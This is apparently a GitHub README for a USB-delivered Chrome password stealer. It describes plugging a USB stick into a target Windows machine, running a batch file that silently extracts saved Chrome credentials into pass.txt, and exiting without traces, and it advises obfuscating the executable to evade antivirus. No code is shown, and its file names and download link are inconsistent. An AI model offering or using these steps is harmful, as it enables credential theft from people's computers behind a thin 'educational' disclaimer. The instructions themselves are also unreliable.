# BadUSB ChromePass Stealer 😈💾

\
*Slip into the shadows and snag Chrome's saved passwords with this sneaky BadUSB script. For educational purposes only, you rogue.*

---

## 💻 What It Does

This BadUSB script turns a USB device into a stealthy attacker that **extracts saved passwords from Google Chrome** on a Windows machine. By clicking a `.bat` file on the USB, it runs silently, grabs the credentials, and saves them to a file named `pass.txt` (customizable name and location). Perfect for red teaming, pen-testing, or learning how attackers operate.

⚠️ **WARNING**: This is a proof-of-concept for educational use. Unauthorized use is illegal and unethical. Don’t be that guy.

---

## 🛠️ Requirements

- **Windows** (7, 8, 10, or 11; tested on 10/11)
- **USB device** (with the `.bat` file and ChromePass utility)
- **Google Chrome** installed on the target machine
- **Dependencies**:
  - PowerShell (pre-installed on Windows)
  - NirSoft’s `ChromePass` utility (included in the USB setup)
- **Admin privileges**: Not required, but the script assumes Chrome’s password database is accessible.

---

## 🚀 Setup

1. **Get BrowserPass**:
   - Download `MyFile` from my Github: [Lostboy069-PasswordTheif]([https://www.nirsoft.net/utils/chromepass.html](https://github.com/Lostboy069/Passw0rd-snatch)).
   - Place `All files` in the USB’s root directory.

2. **Create the Batch File**:
   - Save the provided `.bat` file (e.g., `Myfile.bat`) on the USB.
   - The batch file runs and saves passwords to `pass.txt`.

3. **Prepare the USB**:
   - Create a folder named `loot` on the USB (or your preferred location) to store `pass.txt`.
   - Ensure `myfiles.bat` are in the USB root.

---

## 🖥️ Usage

1. Plug the USB into the target Windows machine.
2. Double-click `myfile.bat` on the USB.
3. The script:
   - Runs silently in the background.+
   - A command promt pops up
   - Extracts Chrome’s saved passwords
   - Saves them to `pass.txt` (or your custom location).
   - Exits without leaving obvious traces.
4. Unplug the USB and check `pass.txt` for the stolen credentials.

### Customizing the Output
- **Change File Name**: Edit the `.bat` file to rename `pass.txt` (e.g., `creds.txt`).
- **Change Location**: Update the `.bat` file to save the file elsewhere (e.g., `C:\Temp\pass.txt` or a different USB folder).

## 🔍 How It Works

1. **Batch File Execution**: Clicking `run_stealer.bat` triggers a hidden PowerShell command.
2. **ChromePass Activation**: `myfile.exe` decrypts and extracts Chrome’s saved passwords.
3. **Output Storage**: Passwords (URLs, usernames, passwords) are saved to `pass.txt` in the specified location.
4. **Stealth Exit**: The script closes silently, minimizing detection.

---

## 🐛 Troubleshooting

- **“ChromePass.exe not found”**:
  - Ensure `myfile.exe` is in the USB root alongside the `.bat` file.
- **No passwords extracted**:
  - Verify Chrome has saved passwords.
  - Check if Chrome’s password database is encrypted with a master password (rare).
- **Batch file doesn’t run**:
  - Right-click and select “Run as Administrator” if issues persist.
  - Ensure the USB is mounted and accessible.
- **Custom location not working**:
  - Verify the path exists (e.g., `C:\Temp` must be created if used).
  - Use double backslashes in paths (e.g., `C:\\Temp\\pass.txt`).

---

## 🔒 Security Notes

- **Ethics**: Only use on systems you own or have explicit permission to test.
- **Detection**: Modern AV might flag `myfile.exe`. Consider obfuscating or compiling your own version.
- **Logs**: Windows Event Viewer might log PowerShell execution.
- **Countermeasures**: Password managers or disabling Chrome’s password storage mitigate this attack.

---

---

## 📜 License

MIT License. Use it, mod it, but don’t cry to me if you get caught.
This is Only for Educational purposes, This Repo/Project don't encorages anyone to do Illegal activity if you do this make sure that you're doing this in a Controlled Enviorment, Thanks
---

*Knowledge is power. Use it wisely.* 🕶️
